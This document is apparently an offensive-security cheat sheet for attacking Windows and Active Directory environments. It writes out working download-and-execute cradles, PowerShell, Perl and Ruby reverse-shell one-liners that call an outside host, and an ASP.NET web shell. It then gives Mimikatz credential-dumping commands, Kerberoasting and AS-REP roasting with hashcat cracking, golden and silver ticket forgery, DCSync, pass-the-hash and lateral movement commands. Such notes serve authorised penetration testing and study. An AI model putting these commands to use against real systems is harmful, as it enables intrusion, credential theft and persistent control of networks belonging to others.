##Check if CMD or Powershell (by PetSerA)
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

----

##Show file content
type file.txt
more file.txt
Get-Content file.txt

----

#Download a file
#Powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://123.123.123.1/nastyscript.ps1")
Invoke-WebRequest -Uri "http://123.123.123.1/nasty.ps1" -OutFile "C:\temp\not_nasty_at_all.ps1"
#Is the same as
wget "http://123.123.123.1/nasty.ps1" -outfile "not_nasty_at_all.ps1"
#If you need credentials to do something (PS will prompt for pw):
Invoke-WebRequest -Uri "http://123.123.123.1/nasty.ps1" -OutFile "C:\temp\not_nasty_at_all.ps1" -Credential "UserName"

#Transfer a file over Powershell remote:
$sess = New-PSSession -ComputerName 10.20.30.40 -Credential username
Copy-Item -FromSession $sess C:\Users\remote_user\Desktop\very_secret_file.txt -Destination C:\Users\local_user\Desktop\stolen_secret_file.txt

#CMD
bitsadmin /transfer downloadJob /download /priority normal http://my.offensive.server/nasty.ps1 c:\nice.ps1
certutil.exe -urlcache -split -f "https://my.offensive.server/nasty.ps1" nice.ps1

----

##Reverse shell
$Oneliner = '$tcp_client=New-Object System.Net.Sockets.TCPClient("123.123.123.1",1234);$client_stream=$tcp_client.GetStream();[byte[]]$stream_bytes=0..65535|%{0};while(($i=$client_stream.Read($stream_bytes,0,$stream_bytes.Length)) -ne 0){;$stream_data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($stream_bytes,0,$i);$response=(iex $stream_data 2>&1 | Out-String );$response2=$response+"PS "+(pwd).Path + "> ";$response_byte=([text.encoding]::ASCII).GetBytes($response2);$client_stream.Write($response_byte,0,$response_byte.Length);$client_stream.Flush()};$tcp_client.Close()'

#Encoded to bytes if needed
$ToBytes = [System.Text.Encoding]::Unicode.GetBytes($Oneliner)

#Encoded to base64 if needed as a parameter etc.
$Base64Enc =[Convert]::ToBase64String($ToBytes)

!REMEMBER! make sure you use UTF16-LE, which for example Linux base64 does not do! (thanks to byt3bl33d3r!)
#Commandline for Unicode
echo "iex(command)" | iconv --to-code UTF-16LE | base64 -w 0
#Commandline for UTF8 ([System.Text.Encoding]::UTF8.GetBytes() won't work on exec
echo -n "abcd" | iconv -f UTF8 -t UTF16LE | base64
#Python
from base64 import b64encode
b64encode('iex(command)'.encode('UTF-16LE'))
#Ruby:
require "base64"
Base64.encode64('iex(command)'.force_encoding('UTF-16LE'))

#Thanks to UB3RSEC
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"123.123.123.1:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
ruby -rsocket -e 'c=TCPSocket.new("123.123.123.1","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

#You can listen for connections on nc -lnvp 1234 for example

----

##Web shell

#ASP.net oneliner webshell, thanks to Seguranca-informatica
#Call by issuing: http://123.123.123.1/shell.asp?cmd=dir
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>

----

#Well-known-SIDs:
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator

----

#Get installed apps info:
#64bit:
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
#32bit:
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

#List network connections
netstat -aon

#Show network interfaces
ipconfig /all

#Show routing table
route print

#Show task manager list and filter through it
tasklist | findstr "whoami"

#Get hostname for IP
[system.net.dns]::gethostentry('192.168.12.34')

#System info
systeminfo

#Check if system is 32/64:
$pointerSizeInBytes = (4, 8)[[Environment]::Is64BitOperatingSystem]; Write-Host ($pointerSizeInBytes*8)bit

#Always lookout for these: Administrators, Backup Operators, Remote Desktop Users, Remote Management User
#Remote Desktop Users can leverage RDP
#Remote Management User can leverage WinRM
#Backup Operators can operate on files they don't own
#"Log on as a batch job" user rights enables leveraging scheduled tasks
#Remember you can elevate with: runas /user:masterAdmin cmd

#User info
whoami
whoami /user
whoami /groups
Get-LocalUser
#Local
net user username
#AD
net user /domain username

#Show in-memory tickets
klist

#Show account policy (password requirements, lockout threshold etc.)
net accounts

#Check what privileges the user has
whoami /priv

#Get path for a bimary
where powershell

#Add user
net user username password /add
net localgroup Adiministrators username /add

#Change user pass
net username password

#Run with other user credentials (you need the password too)
runas /user:otheruser powershell

#Group info
Get-LocalGroup
Get-LocalGroupMember groupname
net localgroup Administrators 
Get-ADGroup groupname
Get-ADGroup -Filter "name -like '*Leaders*'"

#Check users belonging to a group
Get-ADGroupMember "Group Leaders"

#Add user to group
net group "Group Leaders" username /add /domain

#Process Info
Get-Process

#Search for files recursively
Get-ChildItem -Path C:\ -Include *.pdf,*.txt -File -Recurse -ErrorAction SilentlyContinue

#Get user PS command history
Get-History

#Check where PSReadline history is saved
(Get-PSReadlineOption).HistorySavePath

#See running apps
Get-CimInstance -ClassName win32_service | Select Name, State, Pathname | Where-Object {$_.State -like 'running'}

#See application startup type and under which user it get started
Get-CimInstance -ClassName win32_service | Select Name, StartMode, StartName | Where-Object {$_.Name -like 'Apac*'}

#View current user's rightst for binary
icacls "c:\path\to\binary.exe"

#Check if service name,pathname is unquoted (if it is and contains spaces -> possibility to exploit search order)
#First findstr is case insensitive and reverse matching, so only paths not in c:\windows\
#Second findstr also case insensitive and reverse matching, so finds paths not containing quotes
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

#Start/stop services
net start/stop service
start-service/stop-service/restart-service service

#Restart in 1 sec, requires the user having SeShudownPrivilege set
shutdown /r /t1

#Enable running scripts
powershell -ep bypass

#Show the PATH environment variable
$env:path

#List scheduled tasks
Get-ScheduledTask
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v /TN "\Microsoft\Task Name"

----
#Port forwarding

#SSH local port forwarding, listening on all interfaces on on host's port 4455, forwarding through SSH tunnel between current host and 10.0.20.1 to 10.10.10.1 port 5544
#Meaning: outside<--->host:4455<->host<---SSH TUNNEL--->10.0.20.1<--->10.10.10.1:5544, -N makes sure not to open a shell and -L means local forwarding, no output after password
ssh -N -L 0.0.0.0:4455:10.10.10.1:5544 r00t@10.0.20.1

#SSH dynamic port forwarding, listening on hosts all interfaces for connections to port 3456, then forwarding traffic through a tunnel between the host an 10.0.20.1 to any destination port
#Meaning outside<--->host:3456<->host<---SSH TUNNEL--->10.0.20.1<--->any host and port on this side, this is SOCKS, so might need for example proxychains to force traffic as SOCSK
ssh -N -D 0.0.0.0:3456 r00t@10.0.20.1
#To use proxychains you'd need to add "socks5 10.0.20.1 3456" to /etc/proxychains4.conf, then just normally connect preceeding with proxychains command: proxychains smbclient -L //10.0.30.1/ -U admin --password=r00t
#You can also run nmap over this tunnel with proxychains

#SSH remote port forwarding, you need to have sshd running on your machine
# -N makes sure not to open a shell and -R means remote forwarding
# From your remote host running SSHD on localhost on port 5432 redirect through the host running this command to 10.10.10.1 port 5432 authenticating on your remote host's LAN/WAN side sshd
ssh -N -R 127.0.0.1:2345:10.10.10.1:5432 user@192.168.12.34

#SSH remote dynamic port forwarding, again you need sshd running on your machine
# -N makes sure not to open a shell and -R means remote forwarding
# Binds to your hosts loopback port 6666 from the connecting host, authenticating over your host's LAN/WAN side sshd
ssh -N -R 6666 user@192.168.12.34

#Remote port forward <from the socket on your host>:<to the host running plink>:<port to redirect traffic to> <your host ip>
plink.exe -ssh -l username -pw password -R 127.0.0.1:9833:127.0.0.1:3389 192.168.12.34

#Using netsh requires admin privileges
#add a portproxy rule to forward traffic from an IPv4 listener to an IPv4 port (v4tov4) listener port 1234, listener IPv4 address 192.168.12.34 
#forward to port 22 (connectport) on host 10.0.20.1 (connectaddress)
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.12.34 connectport=22 connectaddress=10.0.20.1
#Openingn a hole in the Windows firewall with netsh for the above
netsh advfirewall firewall add rule name="portforward_ssh_1234" protocol=TCP dir=in localip=192.168.12.34 localport=1234 action=allow

#Show portproxy rules
netsh interface portproxy show all

#Using Chisel (https://github.com/jpillora/chisel)
#Run a Chisel server on your host, bound on port 8080 and enabling reverse port forwarding
chisel server --port 8008 --reverse
#On the other end use client and connect to your Chisel server, start the reverse forwarding socks
chisel client 192.168.12.34:8008 R:socks > /dev/null 2>&1 &

----

##Enumerating the AD

#Print out domains and users
net user /domain

#Continue by going through the users, pay attention to naming as it is often that the users have some extra info added to their name based on the user function
#If there was for example a user called megaAdmin under basic users, it might have something of interest if we manage to breach the account
net user megaAdmin /domain

#Enumerate groups, pay attention to custom groups
net group /domain

#Enumerate group members
net group "CasualAdmins" /domain

#Get all SPNs via CMD
dsquery * "ou=domain controllers,dc=testad,dc=local" -filter "(&(objectcategory=computer)(servicePrincipalName=*))" -attr distinguishedName servicePrincipalName
#Or via Powershell
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(servicePrincipalName=*)"
$results = $search.Findall()
foreach( $result in $results ) {
	$userEntry = $result.GetDirectoryEntry()
	Write-host "Object Name	=	"	$userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"
	Write-host "DN	=	"	$userEntry.distinguishedName
	Write-host "Object Cat.	=	" $userEntry.objectCategory
	Write-host "servicePrincipalNames"
	$i=1
	foreach( $SPN in $userEntry.servicePrincipalName ) {
		Write-host "SPN ${i} =$SPN"
		$i+=1
	}
	Write-host ""
}
#Or you can use the enumhelper.ps1

#LDAP-path prototype: LDAP://HostName[:PortNumber][/DistinguishedName], by default the port is either 389 (LDAP) or 636 (LDAPS TLS/SSL)
#CN == CommonName, DN == DistinguishedName, DC == DomainComponent (when referring to DN, otherwise DomainController)
LDAP://DC1.ACME.CORP:389/CN=Dickie,CN=Users,CN=acme,CN=corp

#Using powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
#Get the PDC Owner
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
#Get DN using ADSI
([adsi]'').distinguishedName

#Get DC Name, OS, OS version and IPv4/6, or leave out the filter for full info and filter what needed
Get-ADDomainController -Filter * | Format-Table Name, OperatingSystem, OperatingSystemVersion, IPv4Address, IPv6Address -Wrap -Auto

#Get the Name, OS, OS SP, OS version and IPv4/6 for all devices in domain, or again remove filter and get even more and adjust the filter to your needs
Get-ADComputer -Filter * -Property * | Format-Table Name, OperatingSystem, OperatingSystemServicePack, OperatingSystemVersion, IPv4Address, IPv6Address -Wrap -Auto

##Dynamically obtain the LDAP path using a powershell script, script content:
$pdc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$dn = ([adsi]'').distinguishedName
$ldap_path = "LDAP://$pdc/$dn"

#Add to script to further enumerate
#Get all objects in the whole domain into dir_searcher variable
$dir_entry = New-Object System.DirectoryServices.DirectoryEntry($ldap_path)
$dir_searcher = New-Object System.DirectoryServices.DirectorySearcher($dir_entry)

#And further to enumerate all users in the domain (SamAccountType 0x30000000 => decimal 805306368 == users, see below)
  #SAM_DOMAIN_OBJECT 0x0 ------------------------> 0
  #SAM_GROUP_OBJECT 0x10000000 ------------------> 268435456
  #SAM_NON_SECURITY_GROUP_OBJECT 0x10000001 -----> 268435457
  #SAM_ALIAS_OBJECT 0x20000000 ------------------> 536870912
  #SAM_NON_SECURITY_ALIAS_OBJECT 0x20000001 -----> 536870913
  #SAM_USER_OBJECT 0x30000000 -------------------> 805306368
  #SAM_NORMAL_USER_ACCOUNT 0x30000000 -----------> 805306368
  #SAM_MACHINE_ACCOUNT 0x30000001 ---------------> 805306369
  #SAM_TRUST_ACCOUNT 0x30000002 -----------------> 805306370
  #SAM_APP_BASIC_GROUP 0x40000000 ---------------> 1073741824
  #SAM_APP_QUERY_GROUP 0x40000001 ---------------> 1073741825
  #SAM_ACCOUNT_TYPE_MAX 0x7fffffff --------------> 2147483647

$dir_searcher.filter="samAccountType=805306368"
##You could also filter by any property, for example: $dir_searcher.filter="name=bob_admin" would only display info for bob_admin
$dirsearcher.FindAll()

#And still further, save the result on the previous part's last line to a variable
$user_results = $dirsearcher.FindAll()
#Print all attributes stored in per user properties field over a for loop (produces a LOT of output)
Foreach($user_obj in $user_result)
{
    Foreach($prop in $user_obj.Properties)
    {
        $prop
        #You could also filter the results by property, for example $prop.memberof would display only the groups the user is a member in
    }
    Write-Host "####----------####----------####"
}

You can also just use the https://github.com/LancreFI/offensive/blob/main/enumhelper.ps1 helper script for enumeration.
Or if you want more, go for https://github.com/PowerShellMafia/PowerSploit/

For password spraying with PS over LDAP: https://github.com/r00t-3xp10it/redpill/blob/main/modules/Spray-Passwords.ps1
Detects domain users automatically and sprays a password with -Pass against them or a list of passwords from a file with -File, test
for admins with -Admin in addition.

For password spraying over SMB (slower, noisier), can be done from a Linux host: https://github.com/byt3bl33d3r/CrackMapExec
Make sure to check the password policies first as you might otherwise lock the account, if too many attempts in a certaint time window or 
too many failed attempts etc.
Example: crackmapexec smb 192.168.12.34 -u userlist.txt -p 'p4ssw0rd' -d testdomain.local --continue-on-success
First parameter is the proto, then a host in the domain, list of users, the password to spray, the domain and lastly not to stop on a match
This will also check if the user has admin credentials automatically (will add Pwn3d! after such finding)

For password spray over Ticket Granting Ticket (works on both Linux and Windows): https://github.com/ropnop/kerbrute
Example: ./kerbrute_linux_amd64 passwordspray -d testad.local userlist.txt 4ssw0rd321
For user enumeration
Example: ./kerbrute_linux_amd64 userenum -d testad.local userlist.txt

Or if you want to reinvent the wheel or do something different, you can use: https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html

--

##Using PowerView from the above mentioned PowerSploit

#Find-LocalAdminAccess will attempt to find if the user has admin access on a target machine or the whole domain
#without parameters this will scan the whole domain, but you can also just define a specific host as target and even user/pass
Find-LocalAdminAccess

#Get-NetSession can try to be leveraged to check if there are any users logged in. It leverages NetWkstaUserEnum and NetSessionEnum APIs to
#accomplish this
Get-NetSession -ComputerName targethost -Verbose

#NetSessionEnum has five query levels:  0,1,2,10,502 out of which level 10 is used by PowerView, levels 1 and 2 return the most info
#but require more privileges (admin). HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity hive contains
#the permissions required to enumerate session via NetSessionEnum (readkey or fullcontrol) in the SrvsvcSessionInfo registry key. To view the 
#permissions you can use PS applet Get-Acl: Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
#In older versions of Windows Authenticated Users were allowed to access the registry hive and get information from the SrvsvcSessionInfo key:
#Version before Windows 10 version 16299 == build 1709 and Windows Server 2019 version 17763 == build 1809

#PsLoggedOn from https://learn.microsoft.com/en-us/sysinternals/ can be used to list the logged on users, but relies on Remote Registry 
#service, which needs to be enabled by the admin since Windows 8, by default it is also enable on Windows Server Operating Systems, like 
#Server 2012 R2, 2016 (1607), 2019 (1809), and Server 2022 (21H2) and will be triggered by PsLoggedOn
.\PsLoggedon.exe \\server01

#Enumerate SPNs
Get-NetUser -SPN | select samaccountname,serviceprincipalname

--

##Enumerating service accounts

#Services registered in AD have a Service Principal Name (SPN) which links it to a specific service account, so you can retrieve information
#about running services without necessarily doing large and noisy port scans. If you know for example that a service account called
#sql_serv exists, you can check which service it is tied to by saying the following or checking the previous part about PowerView:
setspn -L sql_serv

#Access Controls Lists (ACL) are made of Access Control Entries.
#Interesting Access Control Entry (ACE) types and descriptions:
# -AllExtendedRights = Change and reset password etc.
# -ForceChangePassword = Can change the password for an object
# -GenericAll = Full permissions on an object
# -GenericWrite = Edit some of the object's attributes
# -Self (Self-Membership) = Add ourselves to a group for example
# -WriteOwner = Change object ownership
# -WriteDACL = Edit ACEs applied to object

#PowerView's Get-ObjectAcl can be used to enumerate ACEs
Get-ObjectAcl 
#And further filter it by applying -Identity username
Get-ObjectAcl -Identity username

#Some of the interesting artifacts are Security Identifiers (SID), which are a mess to decipher on the fly but can be automatically done
#with PowerView
Convert-SidToName S-1-5-21-809893099-1472282828-2400958209-1105
#without PowerView
Get-ADUser -Identity S-1-5-21-809893099-1472282828-2400958209-1105

#If you don't know the type of the SID, you can go through the whole AD:
Get-ADObject -IncludeDeletedObjects -Filter "objectSid -eq 'S-1-5-21-809893099-1472282828-2400958209-1105'"|select Name,ObjectClass

#To find out which SIDs have the highest rights (GenericAll) we can use some extra filtering. Filtering by group:
Get-ObjectAcl -Identity "Group Leaders" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

#Add user to group
net group "Group Leaders" username /add /domain
#Check members of group with powerview
Get-NetGroup "Group Leaders" | select member
#Without
Get-ADGroupMember "Group Leaders" | select username

--

#Finding domain shares with PowerView
#List all:
Find-DomainShare
#List the ones available to our user
Find-DomainShare -CheckShareAccess

#Listing with ls
ls \\FILESERV.domain.tld\sharefolder

#If you happen to find for example some old policy under sysvol:
cat \\dc1.domain.tld\sysvol\domain.tld\Policies\olds\backup_policy.xml
#If the old group policy (GPP) would happen to contain a password, it can be cracked with 
#gpp-decrypt (https://blog.carnal0wnage.com/2012/10/group-policy-preferences-and-getting.html) as the private key has been posted in public

--
##Automatic basic enumeration on a Windows host can be conducted with WinPEAS (https://github.com/carlospolop/PEASS-ng)

##Doing the enumeration automatically with for example SharpHound (https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) + BloodHound (https://github.com/BloodHoundAD/BloodHound/tree/master)

#SharpHound to collect data (note that this causes a lot of noise, so would be a miracle not to get caught somewhere):
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory c:\users\username\desktop\ -OutputPrefix "ad_dump"

#Import the AD data to your offensive host from the target host, should be located on the user's desktop named something along the lines of:
#ad_dump_YYYYMMDDHHmmSS.zip
#To import, you first need to start Neo4J (included with BloodHound when installed with APT in Kali at least) sudo systemctl start neo4j
#After Neo4J is booted up follow the link provided by the startup process to access the local web instance and login (default creds: neo4j/neo4j)
#Next we can start bloodhound
bloodhound
#Bloodhound should detect your Neo service address and prompt you for the credentials and then you get to importing the zip

#Keep refreshing database stats until it looks like all is populated (might take a while if a big AD environ)

#Manual queries:
#Listing all computers:
#MATCH (m:Computer) RETURN m
#Listing the users:
#MATCH (m:User) RETURN m
#Remember to check the prebuilt queries under the Analysis section and mark owned hosts/users, some worth checking:
#	-Find all Domain Admins
#	-Find Computers where Domain Users are Local Admin
#	-Find Workstations where Domain Users can RDP
#	-Find Servers where Domain Users can RDP
#	-Find Shortest Paths to Domain Admins
#	-Find Shortest Path to Domain Admins from Owned Principals (for this you need to mark the owned hosts/users
#	 You can also mark something owned to see what potential it would provide if you'd own it
#Check for users with active session
#MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p


--

##Notes and info on AD auth types:

#NTLM
#Still used by some 3rd party providers and as a fallback, so not completely legacy yet. Also used when authenticatin to IP, instead of hostname or to
#a hostname not registered on the AD integrated DNS.
# 1: Client calculates NTLM hash from the username
# 2: Client sends username to server
# 3: Server responds with nonce (==challenge, random)
# 4: Client replies with an NTLM hash encrypted nonce
# 5: Server sends response, nonce and username to DC
# 6: DC encrypts nonce with NTLM hash and checks it against the received response (DC has all user hashes)
# 7: If response and encrypted nonce match, authentication approval is sent to server

#Kerberos
#The timestamp in AS-REQ is encrypted with a hash derived from the username and password, which in turn is decrypted by KDC, if succesful and the
#timestamp is not duplicate, the auth is considered successful. An Authentication Server Reply (AS-REP) is sent back to the client from the KDC.
#The AS-REP contains a session key, encrypted with the user's password hash (which can be decrypted by the client and reused), and a Ticket Granting 
#Ticket (TGT). The TGT contains information of the user, domain, timestamp, client IP and session key. For security the TGT is encrypted with the NTLM 
#hash of krbtgt account (only known to KDC), which can only be decrypted by KDC. Default validity period for TGT is 10 hours, and renewal doesn't 
#require user to enter password again. KDC now considers the auth complete.
# 1: Client sends Authentication Server Request (AS-REQ) to DC acting as a Key Distribution Center (KDC)
# 2: DC replies with Authentication Server Reply
# 3: Client send Ticket Granting Service Request to DC
# 4: DC replies with Ticket Granting Service Reply
# 5: Client send Application Request to Application Server
# 6: Application Server replies with Service Authentication

#When client wishes to access services it needs to construct a Ticket Granting Service Request (TGS-REQ) consisting of the user, session key encrypted 
#timestamp. name of the resource and the encrypted TGT and send it to KDC. If the resource is in the domain KDC will then decrypt TGT, extract the
#session key and decrypt the username and timestamp with it:
# 1: Timestamp needs to be valid
# 2: TGS-REQ username must match the TGT username
# 3: Client IP must match the client IP in TGT
#If all requirements are met, KDC sends a TGS-REP containing:
# 1: Name of service access is granted to
# 2: Session key to be used between the service and client
# 3: Service Ticket with username and group memebership along with the created session key
#Service ticket's session key and service name are encrypted with the original session key from the creation of the TGT.
#Service ticket is encrypted with with the password hash of the service account where the service is registered under.

#Now the KDC auth process is complete and the client has both a session key and a service ticket to begin the service authentication with.
# 1: Client sends an Application Request (AP-REQ) including username, service ticket session key encrypted timestamp and the service ticket
# 2: App server decrypts the service ticket with the service account's password hash, extracting the username and session key
# 3: App server then decrypts the username from the AP-REQ with the extracted session key
# 4: If the extracted username matches the one from the service ticket the request is accepted
# 5: Before granting access supplied group memberships in the service ticket are inspected and the user assigned the appropriate permissions

#As SSO is being used by Kerberos in MS environ the password hashes are stored in Local Security Authority Subsystem Service (LSASS). One would still
#need LA or SYSTEM creds to extract these and try to decrypt passwords from the hashes with for example Mimikatz (not preferrably being run on the target
#as it is so well known that you will get caught red handed).

--

#Still it's good to handle the basics of Mimikatz through admin powershell access, thanks to among others:

#Enable SeDebugPrivilege, required for many of the commands to be run
privilege::debug

#Dump creds of all logged-on users on the host, on older systems WDigest hashes were used and Mimikatz will automatically decrypt them, others need to
#be cracked by other means
sekurlsa::logonpasswords

#You can also use TGT and Service Tickets, so to get the current user's ticket you'd for example to dir on a SMB share, and then spawn:
sekurlsa::tickets

#If you're lucky and the host is a CA for the domain, you can export unexportable certificates:
crypto::capi
crypto::cng

#List or export certificates
crypto::certificates

#Create golden/silver/trust tickets
kerberos::golden

#List all user tickets (TGT and TGS) in user memory
kerberos::list

#Pass the ticket
kerberos::ptt – Used to inject a stolen/forged Kerberos ticket

#Ask a DC to synchronize an object (get password data for an account)
lsadump::dcsync

#Dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file
#Also used to get specific credential such as krbtgt with parameter /name: "/name:krbtgt"
lsadump::lsa

#Dump credentials for local accounts
lsadump::sam

#Dump trust keys (passwords) for all associated trusts (domain/forest)
LSADUMP::trust

#Inject a malicious SSP to log locally authenticated credentials
misc::memssp

#Inject Skeleton Key into LSASS process on DC, enabling all user authentication to the Skeleton Key patched DC to use a "master password" in addition to their usual password
misc::skeleton

#List Kerberos encryption keys
sekurlsa::ekeys

#List Kerberos credentials for all authenticated users (including services and computer account)
sekurlsa::kerberos

#Get domain Kerberos service account (KRBTGT) password data
sekurlsa::krbtgt

#Pass-the-Hash and Over-Pass-the-Hash
sekurlsa::pth

#List all tokens of the system
token::list

#Impersonate a token, or in combination with /domainadmin to impersonate Domain Admin credentials. Use to elevate to SYSTEM or find a domain admin token on the target
token::elevate 

----

##AS-REP roasting
#By default Kerberos pre-auth is enabled on all accounts, but can be manually disabled for instace due to some sw/tech requirements, and if we would happen to stumble
#upon an account or accounts with pre-auth disabled we can send an AS-REQ and gain AS-REP containing the session key and TGT and hence conduct an offline attack against
#the encrypted part of AS-REP. This can be achieved with for example impacket-GetNPUsers in Linux (https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
Example: impacket-GetNPUsers -dc-ip 192.168.23.45 -request -outputfile roast.hashes testad.local/username

#On a Windows host getting the hash can be done as a pre-authenticated user on the target with Rubeus (https://github.com/GhostPack/Rubeus)
.\Rubeus.exe asreproast /nowrap

#Previous would get us the hash and in order to do a password attack, we can use HashCat as the output is already in a compliant format:
sudo hashcat -m 18200 roast.hashes /home/user/tools/wordlists/rockyou.txt -r /home/user/tools/hashcat/rules/best64.rule --force

##Kerberoasting for extracting and storing the TGS-REP hashes, you can use the same tools. On a Linux box:
sudo impacket-GetUserSPNs -request -dc-ip 192.168.23.45 testad.local/username

#And if performing this as an authenticated domain user, all related SPNs will be identified automatically:
.\Rubeus.exe kerberoast /outfile:kerberoasted.hashes

#Now if any roasted hashes found you can try to decrypt them with HashCat on your Linux box:
sudo hashcat -m 13100 kerberoasted.hashes /home/user/tools/wordlists/rockyou.txt -r /home/user/tools/hashcat/rules/best64.rule --force

#Note that SPNs running in the context of a user are more likely to be breakable instead of managed service account, group managed service account or a computer account
#on which the passwords are 120 characters long random generated and complex. In case of discovering a GenericAll or GenericWrite permissions account instead of 
#resetting the user password a less noisier approach would be attaching an SPN for the user, performing kerberoasting and cracking the password instead (remember to 
#delete the SPN afterwards)

##Silver Ticket
#To forge you own ticket (Silver Ticket) you'd need the following:
# 1. SPN password hash
# 2. Target SPN
# 3. Domain SID
#If you are LA on a machine on which the target service has an establised session, you can obtain the SPN password hash with Mimikatz:
privilege::debug
sekurlsa::logonpasswords
#The Domain SID can be obtained from the previous or by issuing whoami /user (remember to omit RID (the last part))
#You can use the enumhelper.ps1 to list SPNs, but you should already be aware of the SPN you're targeting
#Now to incject the ticket into hosts memory (/ptt), rc4 == NTLM-hash
kerberos::golden /sid:S-1-5-21-809893099-1472282828-2400958209 /domain:testad.local /ptt /target:www01.testad.local /service:http /rc4:1c23dg4567e89012345678b90123db45 /user:username

##Directory Replication Service (DRS) - replication, dcsync attack
#In multi DC environments you can impersonate a DC and request updates etc. on objects, if your SID has needed privileges, the target DC will not check if the request comes from a
#known source. These requests are normally performed by DCs using IDL_DRSGetNCChanges API. To launch a rogue replication request, the user used needs to have following permissions:
# 1. Replicating Directory Changes
# 2. Replicating Directory Changes All
# 3. Replicating Directory Changes in Filtered Set
#By default Domain- and Enterprise Admins and Administrators groups have these rights.
#If you have an account with these righs under your control, you can perform dcsync attack with Mimikatz, just define the user whose credentials you're targeting, should result
#amongst other things with the targeted user's NTLM hash:
lsadump::dcsync /user:testad\target-username
#or you can even go for admin with:
lsadump::dcsync /user:testad\Administrator
#Save the hash on your Linux host and start cracking with hashcat:
hashcat -m 1000 dcsync.hash /home/user/tools/wordlists/rockyou.txt -r /home/user/tools/hashcat/rules/best64.rule --force
#Linux can also be used to perform the dsync attack with impacket, target-username being the user whose credentials we're after, then domain/username:"password"@DC-IP-address:
impacket-secretsdump -just-dc-user target-username testad.local/compromiseduser:"compromised-user-password\!"@192.168.23.45
#Impacket output should look something like the following, where the last part is the NTML-hash of the user. Impacket leverages DRSUAPI:
target-username:1025:bad1d471e70812ebcaa1e913e80401da:12e3d45c6b7a89b01b2cde3456789012:::

----

##Lateral movement
#Spawning a process (calc) on other host if you have LA credentials with now deprecated WMIC, to which UAC does not apply:
wmic /node:192.168.23.45 /user:username /password:password1! process call create "calc"
#This should return the PID and return value 0, indicating a succesful process creation

#Access over WinRM, for example using WinRS
winrs -r:dc.testad.local -u:b0b -p:SuperAdmin  "cmd /c hostname & whoami"
#Or you can just push in a remote shell as the command if you will

#To access with WMI over PowerShell or just PowerShell remoting check out the enumhelper.ps1

#Pass the Hash with impacket wmiexec from a Linux host
#This requires the ADMIN$ share to be available and Windows File and Priter Sharing to be enabled. Works only on services using NTLM auth and uses SMB (TCP 445).
#So works in situations where LA (Local Admin) password hash has been obtained:
/usr/bin/impacket-wmiexec -hashes :3621C2A13F85C7B90B2DB1A990AF411B Administrator@192.168.12.34

#Overpass the Hash, abusing NTLM hash to gain a full TGT and leverage it to gain a TGS.
#For example run a program as some other user. Get user and their cached hash with mimikatz:
privilege::debug
sekurlsa::logonpasswords
#Turn the NTLM hash into a Kerberos ticket with mimikatz, thus avoiding usage of NTLM authentication and start a new ps session as the impersonated user:
sekurlsa::pth /user:user_name /domain:testad.local /ntlm:123abc45d6789012ef3a45678bc90123 /run:powershell
#Cache a Kerberos ticket by authenticating to a net share (any other command leveraging requiring domain credentials):
net use \\shared01
#Show the cached tickets:
klist
#Now we can run PsExec with the cached tickets as it doesn't allow hashes:
.\PsExec.exe \\shared01 cmd

#Pass the Ticket
#If the user doesn't for example have credentials to a share where another user on the same PC has (\\shared01\usernamesfolder), we can leverage mimikatz to extract TGT/TGS from memory:
privilege::debug
sekurlsa::tickets /export
#This will export all TGT/TGS from memory to per ticket .kirbi files
#If there are any @cifs files, it means that the user@cifs has an existing session and a TGS ticket, which can then be injected into your user session:
kerberos::ptt [0;1a2ef]-0-0-40810000-username@cifs-shared01.kirbi
#Verify with
klist
ls \\shared01\usernamesfolder

#Distributed Component Object Model a.k.a. DCOM
#DCOM communicates over RPC on TCP 135 and LA credentials are required to leverage the DCOM Service Control Manager (API)
See enumhelper.ps1 for example usage for remote commands and reverse shell
#Also other methods exist besides the one used in enumhelper leveraging MMC https://www.cybereason.com/blog/dcom-lateral-movement-techniques

##Persistence
#Golden Ticket, a ticket forged using krbtgt password for which you need an account with access to Domain Admin's group or a compromized DC, using mimikatz:
privilege::debug
lsadump::lsa /patch
#Now the ticket can be created using the NTLM-hash and domain SID from results, injecting the ticket doesn't require any special rights
kerberos::purge
kerberos::golden /user:nonprivileged_user /domain:testad.local /sid:S-1-5-21-1234567890-123456789-1234567890 /krbtgt:1234a5bcdefabc6de78fa90b1c234d56 /ptt
#With the injected golden ticket you can now go laterally with privileged cmd:
misc::cmd
#Connecting to DC01 for example, needs to be done with the hostname, with IP the request will be blocked as the auth type would be NTLM:
PsExec.exe \\DC01.testad.local cmd.exe

#Shadow Copies can also be leveraged if you have a user belonging to Domain Admin group to gain AD Database (NTDS.dit), and then pop out all credentials
#using vshadow to dump the database to disk (-p) and disable writes to speed up the process (-nw):
